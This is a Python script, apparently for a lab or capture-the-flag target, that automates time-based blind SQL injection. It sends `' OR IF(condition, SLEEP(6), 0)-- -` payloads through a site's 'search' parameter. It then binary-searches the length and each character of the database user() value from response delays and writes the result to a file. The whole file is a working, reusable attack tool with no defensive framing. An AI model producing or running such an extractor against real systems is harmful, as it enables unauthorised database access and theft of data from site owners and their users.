#!/usr/bin/env python3
"""
extract_user.py
Time-based blind SQLi extractor for the value of user() using the working OR-style payload:
    ?search=' OR IF(<condition>, SLEEP(SLEEP_TIME), 0)-- -

Outputs the found username to extracted_user.txt
"""

import requests, time, sys

# --------- CONFIG ----------
BASE_URL = "http://englishdictionary.hv/"   # keep trailing slash
PARAM = "search"
SLEEP_TIME = 6
TIMEOUT = SLEEP_TIME + 4
THRESH = SLEEP_TIME - 1.5
MAX_LEN = 80            # max length of user() to try
DELAY = 0.12
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Connection": "keep-alive",
}
PROXIES = None  # e.g. {'http': 'http://127.0.0.1:8080'}
# --------- END CONFIG ----------

session = requests.Session()
session.headers.update(HEADERS)
if PROXIES:
    session.proxies.update(PROXIES)

def send_cond(cond):
    payload = f"' OR IF({cond}, SLEEP({SLEEP_TIME}), 0)-- -"
    try:
        t0 = time.time()
        r = session.get(BASE_URL, params={PARAM: payload}, timeout=TIMEOUT)
        elapsed = time.time() - t0
        return elapsed, r
    except requests.exceptions.ReadTimeout:
        return TIMEOUT, None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}", file=sys.stderr)
        return 0.0, None

def cond_true(cond):
    elapsed, _ = send_cond(cond)
    return elapsed > THRESH

def find_length(max_len=MAX_LEN):
    print("[*] Finding LENGTH(user()) with binary search")
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"LENGTH(user()) > {mid}"
        true = cond_true(cond)
        print(f"  test LENGTH > {mid:2d} -> {'TRUE' if true else 'FALSE'}")
        if true:
            lo = mid + 1
        else:
            hi = mid
        time.sleep(DELAY)
    print(f"[+] LENGTH(user()) = {lo}")
    return lo

def extract_value(length):
    print(f"[*] Extracting user() ({length} chars)")
    out = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        found = None
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(user(),{pos},1)) > {mid}"
            if cond_true(cond):
                lo = mid + 1
            else:
                # equality probe
                eq = f"ASCII(SUBSTRING(user(),{pos},1)) = {mid}"
                if cond_true(eq):
                    found = mid
                    out += chr(mid)
                    print(f"  pos {pos}: found '{chr(mid)}' (ASCII {mid})")
                    break
                else:
                    hi = mid - 1
            time.sleep(DELAY)
        if found is None:
            out += "?"
            print(f"  pos {pos}: unknown -> '?'")
    return out

def main():
    print("[*] baseline test (1=1) to ensure OR-style payloads work")
    b = cond_true("1=1")
    elapsed, _ = send_cond("1=1")
    print(f"  baseline elapsed {elapsed:.2f}s -> {'TRUE' if b else 'FALSE'}")
    if not b:
        print("[!] Baseline did not delay. Re-check payload format or increase SLEEP_TIME.")
        return

    length = find_length()
    if length == 0:
        print("[!] LENGTH returned 0. Try increasing MAX_LEN or manually test equality for small lengths.")
        return

    value = extract_value(length)
    print("\n[RESULT] user() = " + value)
    with open("extracted_user.txt", "w") as f:
        f.write(value)
    print("[*] Saved to extracted_user.txt")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
